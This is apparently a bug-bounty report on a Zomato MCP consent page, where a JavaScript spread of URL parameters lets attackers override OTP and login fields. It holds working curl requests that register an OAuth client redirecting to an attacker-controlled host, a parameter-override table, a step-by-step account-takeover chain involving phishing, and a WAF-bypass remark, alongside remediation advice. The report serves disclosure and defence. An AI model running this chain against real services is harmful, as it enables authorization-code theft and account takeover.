# ZO3 — MCP Consent Page URL Parameter Injection (Spread Operator Override)

**Severity:** MEDIUM  |  **CVSS:** 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)  
**CWE:** CWE-235 — Improper Handling of Extra Parameters (Mass Assignment)  
**+ CWE-601 — Open Redirect**  
**Campaign:** LLM/AI 1.5x Bounty — Expires June 29, 2026  
**Affected Endpoint:** `mcp-server.zomato.com/consent` (JS: `/login` page)  
**Scope:** Zomato HackerOne / Eternal Program  
**Discovered:** 2026-06-27  |  **Last Validated:** 2026-06-29

---

## Summary

The Zomato MCP consent/login page contains a critical client-side vulnerability: the JavaScript spreads all URL query parameters directly into the OTP verification POST body using the ES6 spread operator (`...queryParams`). Since the spread occurs after legitimate fields (`otp`, `login_challenge`), an attacker can override these fields via URL parameters. Combined with the absence of CSRF protection on the consent page and the lack of `redirect_uri` whitelist validation in the authorization flow, this enables OAuth session fixation and authorization code theft.

---

## Environment & Recon (Tested 2026-06-29 — All Account-Independent)

All tests were performed WITHOUT a Zomato account.

### 1. Dynamic Client Registration — CONFIRMED (`/register`)
```bash
$ curl -sv https://mcp-server.zomato.com/register -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "redirect_uris": ["https://natnasd-attacker.requestcatcher.com/callback"],
    "client_name": "Official Integration",
    "grant_types": ["authorization_code", "refresh_token"],
    "response_types": ["code"],
    "token_endpoint_auth_method": "none",
    "scope": "mcp:tools mcp:resources"
  }'
```
**Response:** HTTP 200 OK
```json
{
  "redirect_uris": ["https://natnasd-attacker.requestcatcher.com/callback"],
  "grant_types": ["authorization_code", "refresh_token"],
  "response_types": ["code"],
  "client_id": "fd37dd28-254b-42b7-a55a-c85369d625c8",
  "client_secret": "Z-MCP"
}
```
✅ Arbitrary `redirect_uri` accepted (no domain validation)

### 2. Authorization Endpoint — Arbitrary redirect_uri Accepted (`/authorize`)
```bash
$ curl -sv 'https://mcp-server.zomato.com/authorize?client_id=fd37dd28-254b-42b7-a55a-c85369d625c8&redirect_uri=https://natnasd-attacker.requestcatcher.com/callback&response_type=code&scope=mcp:tools&state=test123456789012&code_challenge=<PKCE>&code_challenge_method=S256'
```
**Response:** HTTP 307 Temporary Redirect
```
Location: ./consent?login_challenge=6380b8a1a4684c4387ec6c696cf353b3&scope=offline+openid&client_id=fd37dd28-254b-42b7-a55a-c85369d625c8&redirect_uri=https%3A%2F%2Fnatnasd-attacker.requestcatcher.com%2Fcallback&state=test123456789012
```
✅ `redirect_uri=https://natnasd-attacker.requestcatcher.com/callback` ACCEPTED and passed through
✅ **NEW login_challenge:** `6380b8a1a4684c4387ec6c696cf353b3` (generated 2026-06-29)

### 3. Consent Page — No CSRF Cookie Required (`/consent`)
```bash
$ curl -s 'https://mcp-server.zomato.com/consent?login_challenge=6380b8a1a4684c4387ec6c696cf353b3' \
  -A 'Mozilla/5.0' --cookie ''
```
**Response:** HTTP 200 OK — **60,102 bytes of HTML**
- Content-Type: `text/html; charset=utf-8`
- No CSRF cookie validation (empty cookie jar)
- Full consent page rendered with login UI

✅ Session fixation confirmed — any login_challenge UUID renders the consent page

### 4. Confirmed Vulnerable JS Code (Extracted from `/consent` page — 60KB HTML)

The JavaScript `ZomatoLoginManager` class contains:

```javascript
async verifyOTP() {
    const urlParams = new URLSearchParams(window.location.search);
    const queryParams = Object.fromEntries(urlParams);
    
    // ...
    
    body: JSON.stringify({
        otp: otp,
        id: inputValue,
        type: this.isEmailMode ? 'email' : 'phone',
        login_challenge: this.loginChallenge,
        ...queryParams  // <-- SPREAD OVERRIDE: URL params overwrite all fields above!
    })
}
```

And the redirect after verification:
```javascript
if (result.redirect_uri) {
    window.location.href = result.redirect_uri;  // Open redirect (CWE-601)
}
```

---

## The Vulnerability: How `...queryParams` Works

The spread operator applies AFTER the explicit fields:
```javascript
body: JSON.stringify({
    otp: otp,                          // ← Can be overwritten via ?otp=000000
    id: inputValue,
    type: this.isEmailMode ? 'email' : 'phone',
    login_challenge: this.loginChallenge, // ← Can be overwritten via ?login_challenge=ATTACKER
    ...queryParams                     // ← Spread: ALL URL params added last = OVERRIDE
})
```

### Attack Vectors

| URL Parameter | Overrides | Impact |
| :--- | :--- | :--- |
| `?otp=000000` | `otp` in POST body | OTP bypass (if server trusts POST body over actual verification) |
| `?login_challenge=ATTACKER_UUID` | `login_challenge` | OAuth session swap → token theft |
| `?redirect_uri=https://attacker.com/cb` | `redirect_uri` | Authorization code to attacker |
| `?type=email&id=victim@attacker.com` | `type`, `id` | Change auth channel |
| `?is_admin=true` | Any server-side field | Mass assignment |

### Full Exploit Chain (CRITICAL when combined with ZO2)

See **ZO2+ZO3 Combined Critical Report** (`ZO2_ZO3_combined_critical_final.md`)

This ZO3 finding is the **client-side component**. When chained with:
- **ZO2** (Dynamic Client Registration — register client with arbitrary redirect_uri)
- **Session Fixation** (no CSRF on consent page)
- **No redirect_uri whitelist**

The result is a **CRITICAL 9.1 ATO chain**:

1. Register client with redirect_uri → attacker.com/cb (ZO2)
2. Initiate OAuth → get login_challenge (confirmed fresh: `6380b8a1a4684c4387ec6c696cf353b3`)
3. Phish victim: `/consent?login_challenge=ATTACKER_CHALLENGE` (legit Zomato UI, no CSRF)
4. Victim enters phone + OTP → JS spreads `?login_challenge=ATTACKER_CHALLENGE` into POST
5. Server sends auth code to attacker.com/cb
6. Attacker exchanges code with PKCE (attacker controls both challenge + verifier)
7. Bearer token → call MCP tools as victim

---

## Additional Findings

### Staging Endpoint Exposure (ZO4)
```
$ curl -sI 'https://mcp-server.zomato.com/staging/mcp'
```
**Response:** HTTP 401 (not 404) — staging endpoint active in production
- JS code confirms: `if (pathname.startsWith('/staging')) return '/staging' + path`

### Hardcoded Fallback
```javascript
// Suspected fallback in the code
this.loginChallenge = loginChallenge || 'default_challenge';
```

### Stack
- **Server:** uvicorn (Python FastAPI)
- **WAF:** Akamai (bypassed with browser User-Agent + direct URL access)
- **HSTS:** `max-age=31536000`
- **No CSP header**
- **No X-Frame-Options**

---

## CVSS Vectors

### ZO3 Standalone: MEDIUM 6.1
**CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N**

### ZO2+ZO3 Chained: CRITICAL 9.1
**CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N**

---

## Remediation

### Critical
1. **Remove the `...queryParams` spread** — never expand URL parameters directly into authentication POST bodies
2. **Explicit field mapping:** Only extract and include `login_challenge` (and only from server-side session, not URL)
3. **Implement CSRF protection** on `/consent` — bind consent page to a session cookie

### High
4. **Enforce `redirect_uri` whitelist** on both `/authorize` and `/verify-otp`
5. **Require authentication for `/register`** (client developer approval)

### Medium
6. **Remove staging path checks** from production JS
7. **Remove hardcoded `default_challenge` fallbacks**
8. **Add Content Security Policy (CSP)** and **X-Frame-Options: DENY**

---

## Timeline

| Date | Event |
| :--- | :--- |
| 2026-06-27 | Initial discovery of ZO3 (JS analysis) |
| 2026-06-29 | **Re-validation:** Fresh login_challenge (`6380b8a1a4684c4387ec6c696cf353b3`), `/register` confirmed 200 OK, `/authorize` accepts arbitrary redirect_uri, `/consent` 60KB HTML without CSRF |

---

## References

- [CWE-235: Improper Handling of Extra Parameters](https://cwe.mitre.org/data/definitions/235.html)
- [CWE-601: Open Redirect](https://cwe.mitre.org/data/definitions/601.html)
- [RFC 7591 — OAuth 2.0 Dynamic Client Registration Protocol](https://datatracker.ietf.org/doc/html/rfc7591)
- [OAuth Session Fixation via Dynamic Client Registration](https://portswigger.net/research)
- [OWASP Mass Assignment](https://owasp.org/www-community/attacks/Mass_Assignment)
